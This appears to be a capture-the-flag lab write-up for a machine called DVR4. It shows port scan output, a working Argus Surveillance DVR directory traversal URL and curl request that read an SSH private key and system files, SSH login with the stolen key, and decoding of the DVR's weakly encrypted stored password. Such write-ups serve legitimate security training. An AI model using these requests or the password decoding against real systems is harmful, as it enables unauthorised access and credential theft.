# PG DVR4
## Argus, Path Traversal, LFI, id_rsa
## nmap
```
PORT STATE SERVICE
22/tcp open ssh
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
8080/tcp open http-proxy
49664/tcp open unknown
49668/tcp open unknown
49669/tcp open unknown
```
## Argus Surveillance DVR (8080) LFI id_rsa 
```
https://www.exploit-db.com/exploits/45296?source=post_page-----bd773a6acc54--------------------------------
Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
Argus Surveillance DVR 4.0.0.0 devices allow Unauthenticated Directory Traversal, 
leading to File Disclosure via a ..%2F in the WEBACCOUNT.CGI RESULTPAGE parameter.

If we can find a username we can posibly exploit the lfi vuln.
Found users.html on port 8080

LFI Path Traversal for user Viewer id_rsa 
http://192.168.249.x:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa
URL Decoded for reference:
http://192.168.249.x:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=../../../../../../../../../../../../../../../../Users/Viewer/.ssh/id_rsa

PoC
curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=../../../../../../../../../../../../../../../../Windows/system.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=
```
## SSH id_rsa
```
chmod 400 id_rsa
ssh Viewer@192.168.249.x -i id_rsa
```

## Argus
```
Password for Argus is located in:
C:\ProgramData\PY_Software\Argus Surveillance DVR>more DVRParams.ini

We can crack this weak password encryption with this tool:
https://www.exploit-db.com/exploits/50130?source=post_page-----bd773a6acc54--------------------------------
#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

# Change this value accordingly:
pass_hash = "418DB740F641E03B956BE1D03F7EF6419083956BECB453D1ECB4ECB4"

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown <--- Couldnt find this one.
```
## Code
```
Lets take a look at the code to see whats going on, maybe we can fix it. 

pass_hash = "418DB740F641E03B956BE1D03F7EF6419083956BECB453D1ECB4ECB4"
if (len(pass_hash)%4) != 0:
	print("[!] Error, check your password hash")
	exit()
split = []
n = 4
for index in range(0, len(pass_hash), n):
	split.append(pass_hash[index : index + n])

for key in split:
	if key in characters.keys():
		print("[+] " + key + ":" + characters[key])
	else:
		print("[-] " + key + ":Unknown")

This code appears to be checking and printing information related to a password hash. Let break down the code:
1. Checking the Length of Password Hash:
    The code checks if the length of the pass_hash is divisible by 4. If not, it prints an error message and exits.
python
if (len(pass_hash) % 4) != 0:
    print("[!] Error, check your password hash")
    exit()

2. Splitting the Password Hash:
    The code then splits the password hash into groups of 4 characters.
python
split = []
n = 4
for index in range(0, len(pass_hash), n):
    split.append(pass_hash[index : index + n])

3. Checking and Printing Information:
It iterates through each group and checks if the group is present in the characters dictionary.
If present, it prints the corresponding value; otherwise, it prints "Unknown".
python
for key in split:
    if key in characters.keys():
        print("[+] " + key + ":" + characters[key])
    else:
        print("[-] " + key + ":Unknown")

Real-life Analogy:
Imagine your password is like a book, and this code is dividing the book into paragraphs of four sentences each.
It then looks up each paragraph in a dictionary to see if there is additional information available.

Why It's Important:
This code is likely part of a larger system or script to analyze and understand the structure of a password hash.
It helps identify specific segments and their corresponding information.

There are no symbols so lets check them one by one for the last entry



